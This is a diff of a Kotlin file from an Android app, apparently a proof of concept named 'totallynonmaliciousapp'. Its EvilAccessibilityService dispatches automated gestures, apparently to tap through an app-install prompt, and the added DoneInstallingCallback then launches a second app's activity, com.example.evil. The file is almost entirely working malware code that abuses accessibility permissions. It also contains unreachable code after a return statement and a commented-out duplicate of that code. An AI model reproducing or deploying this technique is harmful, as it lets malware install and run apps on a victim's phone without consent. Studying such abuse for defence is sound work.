@@ -1,25 +1,18 @@
 package jamil.totallynonmaliciousapp.services
 
 import android.accessibilityservice.AccessibilityService
-import android.accessibilityservice.GestureDescription
-import android.graphics.Path
-import android.os.SystemClock
-import android.view.accessibility.AccessibilityEvent
-import android.widget.Toast
-import android.R.attr.packageNames
-import android.R.attr.notificationTimeout
 import android.accessibilityservice.AccessibilityServiceInfo
+import android.accessibilityservice.GestureDescription
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
-import android.net.Uri
-import android.provider.Settings
-import android.support.v4.content.FileProvider
-import jamil.totallynonmaliciousapp.BuildConfig
-import java.io.File
-import java.net.URI
+import android.graphics.Path
 import android.support.v4.content.FileProvider.getUriForFile
+import android.view.accessibility.AccessibilityEvent
+import android.widget.Toast
+import jamil.totallynonmaliciousapp.BuildConfig
 import jamil.totallynonmaliciousapp.R
-import java.security.AccessController.getContext
+import java.io.File
 
 
 class EvilAccessibilityService : AccessibilityService() {
@@ -87,7 +80,52 @@ class EvilAccessibilityService : AccessibilityService() {
         builder.addStroke(stroke1)
         val stroke2 = GestureDescription.StrokeDescription(path, 5000, 100)
         builder.addStroke(stroke2)
-        dispatchGesture(builder.build(), null, null)
+        dispatchGesture(builder.build(), DoneInstallingCallback(), null)
+    }
+    inner class DoneInstallingCallback : AccessibilityService.GestureResultCallback() {
+        override fun onCompleted(gestureDescription: GestureDescription?) {
+            super.onCompleted(gestureDescription)
+
+            val intent = Intent(Intent.ACTION_MAIN)
+            intent.component = ComponentName("com.example.evil", "com.example.evil.MainActivity")
+            startActivity(intent)
+            return
+
+            val builder = GestureDescription.Builder()
+            val path0 = Path()
+            path0.moveTo(860.0f, 1850.0f)
+            val stroke0 = GestureDescription.StrokeDescription(path0, 3000, 100)
+            builder.addStroke(stroke0)
+            val path1 = Path()
+            path1.moveTo(500.0f, 500.0f)
+            path1.lineTo(500.0f, 1500.0f)
+            val stroke1 = GestureDescription.StrokeDescription(path1, 5000, 500)
+            builder.addStroke(stroke1)
+            val path2 = Path()
+            path2.moveTo(940.0f, 145.0f)
+            val stroke2 = GestureDescription.StrokeDescription(path2, 7000, 100)
+            builder.addStroke(stroke2)
+            dispatchGesture(builder.build(), null, null)
+
+
+            /*
+            val builder = GestureDescription.Builder()
+            val path0 = Path()
+            path0.moveTo(860.0f, 1850.0f)
+            val stroke0 = GestureDescription.StrokeDescription(path0, 3000, 100)
+            builder.addStroke(stroke0)
+            val path1 = Path()
+            path1.moveTo(500.0f, 500.0f)
+            path1.lineTo(500.0f, 1500.0f)
+            val stroke1 = GestureDescription.StrokeDescription(path1, 5000, 500)
+            builder.addStroke(stroke1)
+            val path2 = Path()
+            path2.moveTo(940.0f, 145.0f)
+            val stroke2 = GestureDescription.StrokeDescription(path2, 7000, 100)
+            builder.addStroke(stroke2)
+            dispatchGesture(builder.build(), null, null)
+            */
+        }
     }
 
 
